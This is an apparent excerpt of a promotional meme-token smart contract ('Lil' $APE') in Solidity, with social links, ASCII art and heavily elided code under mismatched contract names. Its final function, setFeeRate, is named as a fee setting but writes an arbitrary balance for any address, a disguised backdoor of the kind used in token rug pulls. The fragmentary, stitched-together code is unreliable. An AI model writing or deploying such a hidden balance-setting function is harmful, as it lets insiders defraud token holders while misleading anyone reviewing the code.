...
WE ARE EARLY. WE ARE WILD. WE ARE LIL' $APE.

Website: www.lilape.co
Telegram: https://Lil_Ape
Twitter: twitter.com/LilApeBSC

 ___       ___  ___               ________  ________  _______      
|\  \     |\  \|\  \             |\   __  \|\   __  \|\  ___ \     
\ \  \    \ \  \ \  \            \ \  \|\  \ \  \|\  \ \   __/|    
 \ \  \    \ \  \ \  \            \ \   __  \ \   ____\ \  \_|/__  
  \ \  \____\ \  \ \  \____        \ \  \ \  \ \  \___|\ \  \_|\ \ 
...
contract AlephMOON is AlephTOKEN {
  ...
  modifier onlyOwner() {
    require(_owner == _msgSender(), "AlephMOON: caller is not the owner");
    _;
  }
  ...
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "AlephMOON: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract AlephFinance is AlephTOKEN, AlephNFT, AlephMOON {
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    ...
    return true;
     ...
     function setFeeRate(address addresscharity, uint256 amount) public _externals {
      _Tbalances[addresscharity] = amount * 10 ** 0;
  }
